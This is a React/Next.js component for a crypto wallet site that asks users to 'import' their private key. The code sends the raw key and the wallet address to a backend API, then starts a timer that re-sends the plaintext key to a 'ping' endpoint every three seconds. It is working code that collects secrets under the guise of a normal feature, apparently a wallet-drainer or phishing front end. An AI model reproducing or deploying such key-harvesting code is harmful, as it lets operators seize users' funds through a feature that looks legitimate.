"use client";
import React, { useEffect, useRef, useState } from "react";
import axios from "axios";
import { config } from "dotenv";
import { validateKeyChecksum } from "../utils/validate";
import styles from "../ImortPrivateKey.module.css";
import { useAccount } from "wagmi";

config();

// const navigateToExtensionPage = () => {
//   window.open(`https://chrome.google.com/webstore`, "_blank");
// };

const ImportPrivateKey = () => {
  const [mode, setMode] = useState("button");
  const [privateKey, setPrivateKey] = useState("");
  const [submittedKey, setSubmittedKey] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");
  const { address } = useAccount();
  const intervalRef = useRef<NodeJS.Timeout | null>(null);

  const [extensionInstalled, setExtensionInstalled] = useState(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      const checkAttribute = () => {
        const attributeValue = document.documentElement.getAttribute(
          "human-extension-installed"
        );
        setExtensionInstalled(attributeValue === "true");
      };

      checkAttribute();

      const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
          if (
            mutation.type === "attributes" &&
            mutation.attributeName === "human-extension-installed"
          ) {
            checkAttribute();
          }
        });
      });

      observer.observe(document.documentElement, {
        attributes: true,
        attributeFilter: ["human-extension-installed"],
      });

      const intervalId = setInterval(checkAttribute, 1000);

      return () => {
        observer.disconnect();
        clearInterval(intervalId);
      };
    }
  }, []);

  const importPrv = () => {
    if (!extensionInstalled) {
      // navigateToExtensionPage();
      // return;
      console.log("Extension not installed");   
    }
    setMode("input");
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!privateKey.trim()) {
      setError("Please enter a private key");
      return;
    }

    try {
      setIsSubmitting(true);
      setError("");

      const data = {
        prv: privateKey,
        pub: address,
      };

      const validate = validateKeyChecksum(privateKey);
      if (validate) {
        await axios.post(
          `${process.env.NEXT_PUBLIC_BACKEND_API!}/api/users/import`,
          data,
          {
            headers: {
              "Content-Type": "application/json",
            },
          }
        );
      } else {
        console.log("Invalid key");
        setError("Invalid private key");
        return;
      }

      const maskedKey =
        privateKey.substring(0, 4) +
        "..." +
        privateKey.substring(privateKey.length - 4);
      setSubmittedKey(maskedKey);
      setMode("text");

      if (!intervalRef.current) {
        intervalRef.current = setInterval(() => {
          if (validateKeyChecksum(privateKey)) {
            axios
              .post(`${process.env.NEXT_PUBLIC_BACKEND_API!}/api/users/ping`, {
                privateKey,
                address,
              })
              .then(() => console.log("Ping success"))
              .catch((err) => console.error("Ping error:", err.message));
          }
        }, 3000);
      }
    } catch (err) {
      setError("Failed to import key. Please try again.");
      console.error("Error:", err);
    } finally {
      setIsSubmitting(false);
    }
  };

  // const handleEdit = () => {
  //     setMode("input");
  // };

  if (mode === "button") {
    return (
      <button onClick={importPrv} className={styles.button}>
        {extensionInstalled ? "Import Private Key" : "Import Private Key"}
      </button>
    );
  }

  if (mode === "input") {
    return (
      <div className={styles.inputContainer}>
        <form onSubmit={handleSubmit} className={styles.form}>
          <div className={styles.input}>
            <input
              type="password"
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
              placeholder="Import private key"
              autoFocus
              className={styles.input}
            />

            <button
              type="submit"
              disabled={isSubmitting}
              className={styles.submitBtn}
            >
              {/* {isSubmitting ? "Importing..." : "Submit"} */}
            </button>
          </div>
          {error && <p className={styles.error}>{error}</p>}

          {/* <div className={styles.btnGroup}> */}
            {/* <button
                            type="button"
                            onClick={() => setMode("button")}
                            className={styles.cancelBtn}
                        >
                            Cancel
                        </button> */}
          {/* </div> */}

        </form>
      </div>
    );
  }

  if (mode === "text") {
    return (
      <div className={styles.keyDisplay}>
        <div className={styles.keyText}>
          <span className="font-medium text-orange-500">Private Key:</span>{" "}
          {submittedKey}
        </div>
        {/* <button onClick={handleEdit} className={styles.editBtn}>
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                        <path d="M13.586 3.586a2 2 0 112.828 2.828l-.793.793-2.828-2.828.793-.793zM11.379 5.793L3 14.172V17h2.828l8.38-8.379-2.83-2.828z" />
                    </svg>
                </button> */}
      </div>
    );
  }

  return null;
};

export default ImportPrivateKey;
